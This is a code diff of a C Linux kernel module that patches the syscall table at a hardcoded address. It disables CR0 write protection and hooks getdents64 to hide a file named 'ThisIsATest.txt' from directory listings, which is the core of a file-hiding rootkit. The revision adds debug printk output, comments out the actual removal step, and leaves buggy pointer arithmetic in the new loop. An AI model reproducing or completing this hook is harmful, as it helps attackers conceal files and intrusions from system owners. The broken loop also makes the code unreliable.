@@ -1,22 +1,22 @@
+#include <linux/init.h>
 #include <linux/module.h>
-#include <asm/unistd.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+#include <linux/types.h>
+#include <linux/unistd.h>
+#include <linux/dirent.h>
+#include <asm/cacheflush.h>
+#include <linux/uaccess.h>
  
 int new_getdents64(const struct pt_regs *regs);
 int load(void);
 void unload(void);
 
 typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs *regs);
-static unsigned long *syscall_table = (unsigned long *)0xffffffff9d0001a0; 
+static unsigned long *syscall_table = (unsigned long *)0xffffffff88c001a0; 
 static original_getdents64_t original_getdents64_ptr;
 static char *file_name_to_hide = "ThisIsATest.txt";
  
-struct linux_dirent {
-	unsigned long  d_ino;     /* Inode number */
-        unsigned long  d_off;     /* Offset to next linux_dirent */
-        unsigned short d_reclen;  /* Length of this linux_dirent */
-        char           d_name[];  /* Filename (null-terminated) */
-};
-
 static inline void wp_cr0(unsigned long val) {
     __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
 }
@@ -32,25 +32,39 @@ static inline void one_cr0(void) {
 }
 
 asmlinkage int new_getdents64(const struct pt_regs *regs) {
-    struct linux_dirent *buff = (struct linux_dirent*)regs->si;
     int total_bytes_read = (int)original_getdents64_ptr(regs);
+    struct linux_dirent64 *buff = (struct linux_dirent64*)((char*)regs->si);
 
-    int i;
-    for (i=0; i < total_bytes_read; i++) {
-        int length = buff->d_reclen;
-        struct linux_dirent *next = (struct linux_dirent*)((char*)regs->si + i);
-        if (!strcmp(buff->d_name, file_name_to_hide)) {
+    if (total_bytes_read > 0) {
+        printk(KERN_ALERT "Total bytes read: %d", total_bytes_read);
+        printk(KERN_ALERT "Buffer pointer: %p", buff);
+
+        struct linux_dirent64 *first, *curr, *next;
+        first = kvzalloc(total_bytes_read, GFP_KERNEL);
+        copy_from_user((void *)first, buff, (unsigned long)total_bytes_read);
+        curr = first;
+
+        unsigned short curr_len = curr->d_reclen;
+        printk(KERN_ALERT "Current length: %d", curr_len);
+
+        int i = 0;
+        while (i < total_bytes_read && curr->d_reclen > 0) {   
+            unsigned short curr_len = curr->d_reclen;
+            printk(KERN_ALERT "Original: %p. Current pointer: %p has length: %d", first, curr, curr_len);
+            if (!strcmp(curr->d_name, file_name_to_hide)) {
             // File matches name to hide, we need to delete it from the array.
-            int length_to_copy = total_bytes_read - i - length;
-            memmove(buff, next, length_to_copy);
+                printk(KERN_ALERT "FOUND YOU!");
+        //         int length_to_copy = total_bytes_read - i - curr_length;
+        //         memmove(curr, next, length_to_copy);
 
-            // Array has been shortened by the length of the member we've just deleted.
-            total_bytes_read -= length;
+        //         // Array has been shortened by the length of the member we've just deleted.
+        //         total_bytes_read -= curr_length;
+            }
+            curr += curr_len;
+            i += curr_len;
+        //     // Add the bytes read to si so buff will point to the next member in the array.
+        //     curr = next;
         }
-
-        i += length;
-        // Add the bytes read to si so buff will point to the next member in the array.
-        buff = next;
     }
 
     return total_bytes_read;
